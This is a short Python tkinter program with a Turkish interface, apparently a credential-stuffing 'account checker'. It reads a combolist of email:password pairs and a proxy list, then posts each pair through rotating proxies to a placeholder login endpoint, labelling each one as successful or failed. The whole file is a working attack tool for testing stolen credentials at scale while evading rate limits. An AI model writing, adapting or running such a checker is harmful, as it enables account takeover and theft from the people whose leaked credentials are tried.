import tkinter as tk
import requests

window = tk.Tk()
window.title("Hesap Kontrolü")

window.configure(bg="#000000")


tk.Label(window, text="E-posta:", fg="#ffffff", bg="#000000").grid(row=0, column=0)
email_entry = tk.Entry(window)
email_entry.grid(row=0, column=1)

tk.Label(window, text="Şifre:", fg="#ffffff", bg="#000000").grid(row=1, column=0)
password_entry = tk.Entry(window, show="*")
password_entry.grid(row=1, column=1)


tk.Label(window, text="Proxy Dosyası:", fg="#ffffff", bg="#000000").grid(row=2, column=0)
proxy_file_entry = tk.Entry(window)
proxy_file_entry.grid(row=2, column=1)


tk.Label(window, text="Combolist Dosyası:", fg="#ffffff", bg="#000000").grid(row=3, column=0)
combolist_file_entry = tk.Entry(window)
combolist_file_entry.grid(row=3, column=1)


def check_account():

    with open(proxy_file_entry.get(), "r") as f:
        proxies = f.readlines()


    with open(combolist_file_entry.get(), "r") as f:
        combos = f.readlines()


    for combo in combos:

        email, password = combo.split(":")

        proxy = proxies[combos.index(combo) % len(proxies)].strip()

        response = requests.post("https://example.com/api/check_account",
                                  data={"email": email,
                                        "password": password},
                                  proxies={"http": f"http://{proxy}",
                                           "https": f"https://{proxy}"})


        if response.status_code == 200:
            tk.Label(window, text=f"{email}:{password} - Başarılı",
                      fg="green", bg="#000000").grid(row=4 + combos.index(combo), column=1)
        else:
            tk.Label(window, text=f"{email}:{password} - Başarısız",
                      fg="red", bg="#000000").grid(row=4 + combos.index(combo), column=1)

check_account_button = tk.Button(window, text="Hesapları Kontrol Et", fg="#ffffff", bg="#000000",
                                 command=check_account)
check_account_button.grid(row=5, column=1)

window.mainloop()